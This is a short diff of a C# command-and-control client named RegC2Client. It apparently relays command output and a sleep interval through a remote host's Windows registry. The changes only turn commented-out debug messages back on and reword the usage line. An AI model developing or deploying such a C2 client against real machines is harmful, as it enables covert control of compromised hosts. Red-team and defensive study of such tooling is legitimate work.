@@ -61,7 +61,7 @@ namespace RegC2Client
             }
             catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
+                Console.WriteLine(ex.Message);
                 return false;
             }
             try
@@ -69,11 +69,11 @@ namespace RegC2Client
                 myReg.SetValue("output", output);
             } catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
+                Console.WriteLine(ex.Message);
                 return false;
             }
 
-            //Console.WriteLine("Output updated successfully");
+            Console.WriteLine("Output updated successfully");
             myReg.Close();
 
             return true;
@@ -92,12 +92,12 @@ namespace RegC2Client
             catch (Exception ex)
             {
                 //Console.WriteLine(ex.Message);
-                //Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
+                Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
                 return sleepTime;
             }
 
             sleepTime = Int32.Parse(myReg.GetValue("sleep").ToString());
-            //Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
+            Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
             myReg.Close();
 
             return sleepTime;
@@ -131,8 +131,8 @@ namespace RegC2Client
             bool active = true;
             if (args.Length != 2)
             {
-                Console.WriteLine("RegC2Client.exe <host> <Registry name to use>");
-                Console.WriteLine("RegC2Client.exe WS01 client01");
+                Console.WriteLine("RegC2Client.exe <hostname> <RegistryKey name to use>");
+                Console.WriteLine("RegC2Client.exe ws01 dc01");
                 Environment.Exit(0);
             }
             string host = args[0];
